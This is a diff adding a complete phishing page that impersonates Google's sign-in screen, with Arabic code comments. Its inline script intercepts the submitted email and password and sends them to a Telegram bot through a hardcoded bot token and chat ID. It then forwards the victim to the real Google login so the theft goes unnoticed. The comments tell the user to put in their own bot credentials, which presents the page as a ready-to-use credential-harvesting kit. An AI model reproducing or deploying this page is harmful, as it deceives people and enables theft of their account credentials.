@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Sign In</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/368px-Google_2015_logo.svg.png" alt="Google Logo" class="logo">
+    <h2>Sign in</h2>
+    <p>Use your Google Account. The account will be added to this device and available to other Google apps.</p>
+    <form id="loginForm" action="https://accounts.google.com/signin" method="get">
+      <input type="text" id="email" name="email" placeholder="Email or phone" class="input-box" required>
+      <input type="password" id="password" name="password" placeholder="Password" class="input-box" required>
+      <a href="#" class="link">Forgot email?</a>
+      <div class="buttons">
+        <a href="#" class="link">Create account</a>
+        <button type="submit" class="btn">Next</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '8144510411:AAF2y_BYDCnGEbUCRppB3oGIJYKxGfLvMGg'; // استبدل بـ API الخاص بالبوت
+    const CHAT_ID = '8035350322';    // استبدل بـ Chat ID الخاص بك
+    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const message = `Email: ${email}\nPassword: ${password}`;
+
+      // إرسال البيانات إلى بوت التلجرام
+      fetch(API_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Data sent to Telegram successfully.');
+        } else {
+          console.error('Failed to send data to Telegram.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      })
+      .finally(() => {
+        // إعادة توجيه المستخدم إلى صفحة تسجيل الدخول الخاصة بجوجل
+        document.getElementById('loginForm').submit();
+      });
+    });
+  </script>
+</body>
+</html>
